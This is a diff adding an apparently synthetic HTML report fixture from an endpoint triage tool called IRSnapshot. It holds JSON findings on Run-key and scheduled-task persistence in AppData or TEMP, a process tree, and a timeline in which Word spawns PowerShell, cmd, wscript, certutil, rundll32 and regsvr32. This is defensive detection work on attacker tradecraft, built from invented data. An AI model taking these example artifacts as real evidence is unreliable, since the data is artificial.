+          &#34;field&#34;: &#34;owner_sid&#34;,
+          &#34;value&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+          &#34;explanation&#34;: &#34;Captured owner SID used only for owner-scoped environment expansion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+          &#34;field&#34;: &#34;location&#34;,
+          &#34;value&#34;: &#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&#34;,
+          &#34;explanation&#34;: &#34;Captured registry location and owner scope.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+          &#34;field&#34;: &#34;path_basis&#34;,
+          &#34;value&#34;: &#34;The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;,
+          &#34;explanation&#34;: &#34;Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+          &#34;field&#34;: &#34;command&#34;,
+          &#34;value&#34;: &#34;\&#34;%APPDATA%\\ExampleVendor\\startup.exe\&#34; --synthetic&#34;,
+          &#34;explanation&#34;: &#34;Original Run-key command; it was not executed or rewritten.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+          &#34;field&#34;: &#34;interpreted_target&#34;,
+          &#34;value&#34;: &#34;%APPDATA%\\ExampleVendor\\startup.exe&#34;,
+          &#34;explanation&#34;: &#34;The explicit executable or supported script target retained from evidence.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+          &#34;field&#34;: &#34;target_provenance&#34;,
+          &#34;value&#34;: &#34;raw_command_executable&#34;,
+          &#34;explanation&#34;: &#34;The parser records how the target was obtained without executing it.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;a58a7be7-0f54-5b6e-bafa-a1ee8782f40e&#34;,
+      &#34;rule_id&#34;: &#34;IRS-R002&#34;,
+      &#34;title&#34;: &#34;Scheduled-task target in AppData or TEMP&#34;,
+      &#34;severity&#34;: &#34;medium&#34;,
+      &#34;description&#34;: &#34;One or more scheduled-task actions have an explicit executable or supported script target in conventional AppData or TEMP locations identified from captured roots. This is a lexical heuristic; legitimate per-user automation can use these locations.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000006&#34;
+      ],
+      &#34;pids&#34;: [],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;enabled&#34;,
+          &#34;value&#34;: false,
+          &#34;explanation&#34;: &#34;Captured enabled state; disabled tasks remain inventory and findings.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;task_path&#34;,
+          &#34;value&#34;: &#34;\\Examples\\&#34;,
+          &#34;explanation&#34;: &#34;Captured full task namespace path.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;name&#34;,
+          &#34;value&#34;: &#34;ExampleTask&#34;,
+          &#34;explanation&#34;: &#34;Captured task name.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;principal&#34;,
+          &#34;value&#34;: &#34;ExampleUser&#34;,
+          &#34;explanation&#34;: &#34;Captured task principal; no SID is inferred from this name.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;state&#34;,
+          &#34;value&#34;: &#34;Disabled&#34;,
+          &#34;explanation&#34;: &#34;Captured task state; it is not evidence that the task ran.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[0].path_basis&#34;,
+          &#34;value&#34;: &#34;The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;,
+          &#34;explanation&#34;: &#34;Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[1].path_basis&#34;,
+          &#34;value&#34;: &#34;The normalized path is within a captured temp root; this is a lexical location hint, not an ACL or trust decision.&#34;,
+          &#34;explanation&#34;: &#34;Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[0].executable&#34;,
+          &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;,
+          &#34;explanation&#34;: &#34;Original separately collected task executable field.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[1].executable&#34;,
+          &#34;value&#34;: &#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;,
+          &#34;explanation&#34;: &#34;Original separately collected task executable field.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[0].arguments&#34;,
+          &#34;value&#34;: &#34;--synthetic&#34;,
+          &#34;explanation&#34;: &#34;Original task argument string; it was not executed.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[1].arguments&#34;,
+          &#34;value&#34;: &#34;-NoProfile -File \&#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1\&#34;&#34;,
+          &#34;explanation&#34;: &#34;Original task argument string; it was not executed.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[0].target&#34;,
+          &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;,
+          &#34;explanation&#34;: &#34;The explicit executable or supported script target retained from evidence.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[1].target&#34;,
+          &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1&#34;,
+          &#34;explanation&#34;: &#34;The explicit executable or supported script target retained from evidence.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[0].target_provenance&#34;,
+          &#34;value&#34;: &#34;task_action_executable&#34;,
+          &#34;explanation&#34;: &#34;The parser records how the target was obtained without executing it.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[1].target_provenance&#34;,
+          &#34;value&#34;: &#34;powershell_file&#34;,
+          &#34;explanation&#34;: &#34;The parser records how the target was obtained without executing it.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[0].index&#34;,
+          &#34;value&#34;: 0,
+          &#34;explanation&#34;: &#34;Zero-based index of this matching action in captured order.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+          &#34;field&#34;: &#34;actions[1].index&#34;,
+          &#34;value&#34;: 1,
+          &#34;explanation&#34;: &#34;Zero-based index of this matching action in captured order.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;d40d5751-659b-5fea-ba66-5c28818bd2c3&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P007&#34;,
+      &#34;title&#34;: &#34;Process executable in AppData&#34;,
+      &#34;severity&#34;: &#34;low&#34;,
+      &#34;description&#34;: &#34;The captured executable is in AppData, outside the conventional Local AppData Programs subtree and any more-specific TEMP classification. Legitimate per-user applications commonly use AppData; this lexical heuristic does not measure trust or ACLs.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000597&#34;
+      ],
+      &#34;pids&#34;: [
+        431
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000597&#34;,
+          &#34;field&#34;: &#34;executable&#34;,
+          &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured executable path required by this location rule.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000597&#34;,
+          &#34;field&#34;: &#34;path_basis&#34;,
+          &#34;value&#34;: &#34;The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;,
+          &#34;explanation&#34;: &#34;Classifier basis; this makes no ACL, trust, or existence claim.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000597&#34;,
+          &#34;field&#34;: &#34;normalized_path&#34;,
+          &#34;value&#34;: &#34;c:\\users\\exampleuser\\appdata\\roaming\\examplevendor\\example-agent.exe&#34;,
+          &#34;explanation&#34;: &#34;Lexically normalized Windows path derived only from captured context.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    }
+  ],
+  &#34;process_tree&#34;: {
+    &#34;nodes&#34;: [
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+        &#34;parent_id&#34;: null,
+        &#34;child_ids&#34;: [
+          &#34;00000000-0000-0000-0000-000000000582&#34;,
+          &#34;00000000-0000-0000-0000-000000000596&#34;,
+          &#34;00000000-0000-0000-0000-000000000597&#34;,
+          &#34;00000000-0000-0000-0000-0000000005a0&#34;,
+          &#34;00000000-0000-0000-0000-0000000005a1&#34;,
+          &#34;00000000-0000-0000-0000-0000000005a2&#34;
+        ],
+        &#34;parent_status&#34;: &#34;missing&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+        &#34;child_ids&#34;: [
+          &#34;00000000-0000-0000-0000-00000000058c&#34;,
+          &#34;00000000-0000-0000-0000-00000000058d&#34;,
+          &#34;00000000-0000-0000-0000-00000000058e&#34;
+        ],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-00000000058c&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-00000000058d&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-00000000058e&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-000000000596&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-000000000597&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-0000000005a0&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-0000000005a1&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      },
+      {
+        &#34;process_id&#34;: &#34;00000000-0000-0000-0000-0000000005a2&#34;,
+        &#34;parent_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+        &#34;child_ids&#34;: [],
+        &#34;parent_status&#34;: &#34;linked&#34;
+      }
+    ],
+    &#34;root_ids&#34;: [
+      &#34;00000000-0000-0000-0000-000000000578&#34;
+    ]
+  },
+  &#34;network_links&#34;: [],
+  &#34;finding_context&#34;: [
+    {
+      &#34;finding_id&#34;: &#34;268e5ec8-2180-5764-a0dd-9ba61d980e48&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a0&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;3412a101-2845-5107-9935-047196c427e6&#34;,
+      &#34;process_ids&#34;: [],
+      &#34;ancestor_ids&#34;: [],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;3a4512c4-5fe0-5eb3-bd68-64a17fab0bba&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a1&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;3f9c0ab6-6e28-5afd-854a-6e6746f658c4&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000596&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;4e656e63-016d-54d9-8eab-8cf38283c92a&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;00000000-0000-0000-0000-00000000058c&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [
+        &#34;00000000-0000-0000-0000-00000000058d&#34;,
+        &#34;00000000-0000-0000-0000-00000000058e&#34;
+      ],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;82825a4d-5611-5247-b235-e3fcfce02a85&#34;,
+      &#34;process_ids&#34;: [],
+      &#34;ancestor_ids&#34;: [],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;87bd0b77-ac59-539a-a23f-7319bc845375&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a2&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;88ddbb83-0acb-5b9c-9010-e917391a380c&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;00000000-0000-0000-0000-00000000058e&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [
+        &#34;00000000-0000-0000-0000-00000000058c&#34;,
+        &#34;00000000-0000-0000-0000-00000000058d&#34;
+      ],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;9b3adc97-9c46-55d7-82d8-bf20872ce78a&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;00000000-0000-0000-0000-00000000058d&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [
+        &#34;00000000-0000-0000-0000-00000000058c&#34;,
+        &#34;00000000-0000-0000-0000-00000000058e&#34;
+      ],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;a58a7be7-0f54-5b6e-bafa-a1ee8782f40e&#34;,
+      &#34;process_ids&#34;: [],
+      &#34;ancestor_ids&#34;: [],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    },
+    {
+      &#34;finding_id&#34;: &#34;d40d5751-659b-5fea-ba66-5c28818bd2c3&#34;,
+      &#34;process_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000597&#34;
+      ],
+      &#34;ancestor_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ],
+      &#34;child_ids&#34;: [],
+      &#34;connection_ids&#34;: []
+    }
+  ],
+  &#34;timeline&#34;: [
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:00Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: explorer.exe (PID 400)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000578&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:01Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: WINWORD.EXE (PID 410)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000582&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:02Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: powershell.exe (PID 420)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-00000000058c&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:03Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: cmd.exe (PID 421)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-00000000058d&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:04Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: wscript.exe (PID 422)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-00000000058e&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:05Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: example-installer.exe (PID 430)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000596&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:06Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: example-agent.exe (PID 431)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000597&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:07Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: certutil.exe (PID 440)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a0&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:08Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: rundll32.exe (PID 441)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a1&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:00:09Z&#34;,
+      &#34;kind&#34;: &#34;process_start&#34;,
+      &#34;basis&#34;: &#34;reported&#34;,
+      &#34;description&#34;: &#34;Process started: regsvr32.exe (PID 442)&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a2&#34;
+      ]
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+      &#34;kind&#34;: &#34;collection_start&#34;,
+      &#34;basis&#34;: &#34;observed&#34;,
+      &#34;description&#34;: &#34;Collection started&#34;,
+      &#34;artifact_ids&#34;: []
+    },
+    {
+      &#34;timestamp&#34;: &#34;2026-09-17T14:05:10Z&#34;,
+      &#34;kind&#34;: &#34;collection_end&#34;,
+      &#34;basis&#34;: &#34;observed&#34;,
+      &#34;description&#34;: &#34;Collection finished&#34;,
+      &#34;artifact_ids&#34;: []
+    }
+  ],
+  &#34;issues&#34;: []
+}</pre></details>
+</section>
+</main><footer class="muted">IRSnapshot · Evidence for analyst review. Location and command heuristics require context; unsupported grammar and collection gaps limit conclusions.</footer>
+</body></html>
